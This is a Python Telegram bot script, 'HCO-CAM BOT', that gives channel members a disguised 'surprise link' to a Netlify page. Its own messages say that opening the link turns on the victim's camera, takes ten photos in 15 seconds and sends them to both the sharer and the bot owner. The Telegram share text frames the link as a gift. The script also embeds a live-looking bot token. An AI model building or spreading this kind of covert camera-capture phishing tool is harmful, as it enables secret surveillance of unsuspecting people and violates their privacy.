#!/usr/bin/env python3
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

# ========== CONFIGURATION ==========
BOT_TOKEN = "8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI"
OWNER_CHAT_ID = 8215819954
CHANNEL_USERNAME = "@HackersColony"
OWNER_USERNAME = "@Hackers_Colony_Official"
NETLIFY_URL = "https://gleaming-marigold-231ffe.netlify.app"
CHANNEL_LINK = "https://t.me/HackersColony"

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== CHECK CHANNEL JOIN ==========
async def check_channel(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ========== START COMMAND ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # Check if user joined channel
    if not await check_channel(user_id, context):
        text = f"""
👋 <b>Hey {user.first_name}!</b>

🔒 <b>ACCESS REQUIRED</b>
You must join our channel to use this bot!

📢 <b>Channel:</b> @HackersColony

👇 <i>Join then click VERIFY</i>
"""
        keyboard = [
            [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
            [InlineKeyboardButton("✅ VERIFY JOIN", callback_data="verify")]
        ]
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    await show_menu(update)

# ========== VERIFY JOIN ==========
async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if await check_channel(user_id, context):
        await query.edit_message_text(
            "✅ <b>VERIFIED!</b>\n\nWelcome to HCO-Cam Bot! 🎉",
            parse_mode=ParseMode.HTML
        )
        await show_menu_callback(query)
    else:
        await query.edit_message_text(
            "❌ <b>NOT VERIFIED!</b>\n\nYou haven't joined our channel yet!\n\nClick JOIN then VERIFY again.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
                [InlineKeyboardButton("🔄 VERIFY AGAIN", callback_data="verify")]
            ])
        )

# ========== SHOW MENU ==========
async def show_menu(update: Update):
    user = update.effective_user
    text = f"""
<b>🎮 HCO-CAM BOT</b>

Welcome <b>{user.first_name}</b>!

<i>Choose an option:</i>
"""
    keyboard = [
        [InlineKeyboardButton("🔗 CREATE SURPRISE LINK", callback_data="create_link")],
        [InlineKeyboardButton("👤 CONTACT", callback_data="contact")],
        [InlineKeyboardButton("🔄 VERIFY STATUS", callback_data="verify")]
    ]
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def show_menu_callback(query):
    user = query.from_user
    text = f"""
<b>🎮 HCO-CAM BOT</b>

Welcome <b>{user.first_name}</b>!

<i>Choose an option:</i>
"""
    keyboard = [
        [InlineKeyboardButton("🔗 CREATE SURPRISE LINK", callback_data="create_link")],
        [InlineKeyboardButton("👤 CONTACT", callback_data="contact")],
        [InlineKeyboardButton("🔄 VERIFY STATUS", callback_data="verify")]
    ]
    await query.edit_message_text(
        text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ========== CREATE LINK ==========
async def create_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Verify again
    if not await check_channel(user_id, context):
        await query.edit_message_text(
            "❌ <b>ACCESS DENIED!</b>\n\nJoin channel first!",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
                [InlineKeyboardButton("🔄 VERIFY", callback_data="verify")]
            ])
        )
        return
    
    user_name = query.from_user.first_name
    link = f"{NETLIFY_URL}?uid={user_id}&name={user_name}"
    
    text = f"""
<b>🎁 YOUR SURPRISE LINK!</b>

<code>{link}</code>

<b>⚡ WHAT HAPPENS:</b>
1. Friend opens link
2. Camera activates immediately
3. 10 photos captured FAST
4. Photos sent to BOTH of us
5. Done in 15 seconds! ⚡

<i>Share with friends for fun! 😄</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("📤 SHARE LINK", 
            url=f"https://t.me/share/url?url={link}&text=🎁+Surprise+gift+for+you!")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ========== CONTACT ==========
async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = f"""
<b>📞 CONTACT</b>

<b>Owner:</b> {OWNER_USERNAME}
<b>Channel:</b> {CHANNEL_USERNAME}

<i>For support or questions</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("💬 MESSAGE", url=f"https://t.me/{OWNER_USERNAME[1:]}")],
        [InlineKeyboardButton("📢 CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("⬅️ BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ========== HANDLE BUTTONS ==========
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data == "verify":
        await verify(update, context)
    elif data == "create_link":
        await create_link(update, context)
    elif data == "contact":
        await contact(update, context)
    elif data == "back":
        await show_menu_callback(query)

# ========== MAIN ==========
def main():
    print("""
    ╔══════════════════════════╗
    ║   HCO-CAM BOT v2.0       ║
    ║   ⚡ SUPER FAST MODE     ║
    ║   15 SECOND CAPTURE      ║
    ╚══════════════════════════╝
    """)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_buttons))
    
    print(f"✅ Bot running: {BOT_TOKEN[:10]}...")
    print(f"🌐 Web: {NETLIFY_URL}")
    print("⚡ Features: Fast 15s capture")
    print("📸 Camera: Front, 10 images")
    print("📤 Send: Both user & owner")
    print("\nPress Ctrl+C to stop\n")
    
    app.run_polling()

if __name__ == '__main__':
    main()
